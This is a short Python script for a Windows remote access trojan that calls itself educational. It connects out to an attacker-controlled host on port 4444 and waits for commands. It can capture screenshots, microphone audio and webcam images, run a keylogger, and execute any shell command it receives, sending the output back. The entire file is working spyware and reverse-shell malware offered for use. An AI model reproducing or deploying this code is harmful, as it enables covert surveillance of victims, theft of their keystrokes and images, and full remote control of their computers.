# KHEMRA REMOTE Target Windows
# Created by Khemra (Educational use only)
import socket, subprocess, pyautogui, cv2, sounddevice, wave, io
from pynput import keyboard

HOST = 'past the ip hacker' # IP Kali Linux Server Hacker
PORT = 4444

s = socket.socket()
s.connect((HOST, PORT))

# Screenshot capture
def screenshot():
    img = pyautogui.screenshot()
    buf = io.BytesIO()
    img.save(buf, format='PNG')
    s.sendall(buf.getvalue() + b"<END>")

# Voice record
def voice():
    fs = 44100
    duration = 5
    audio = sounddevice.rec(int(duration*fs), fs, 2)
    sounddevice.wait()
    wave_file=wave.open('audio.wav','wb')
    wave_file.setnchannels(2)
    wave_file.setsampwidth(2)
    wave_file.setframerate(fs)
    wave_file.writeframes(audio)
    wave_file.close()
    s.send(b'Voice recorded audio.wav<END>')

# Webcam photo
def webcam():
    cap = cv2.VideoCapture(0)
    ret,frame = cap.read()
    cv2.imwrite('webcam.png',frame)
    cap.release()
    s.send(b'Webcam photo saved webcam.png<END>')

# Keylogger function
def keylogger():
    def on_press(key):
        with open("keylog.txt","a") as log:
            log.write(f"{key}\n")
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    s.send(b"Keylogger Started<END>")

# Command Handler
while True:
    cmd = s.recv(1024).decode()
    if cmd=='screenshot':
        screenshot()
    elif cmd=='voice':
        voice()
    elif cmd=='webcam':
        webcam()
    elif cmd=='keylogger':
        keylogger()
    else:
        result=subprocess.getoutput(cmd)
        if not result:
            result='Executed'
        s.send(result.encode()+b"<END>")

s.close()
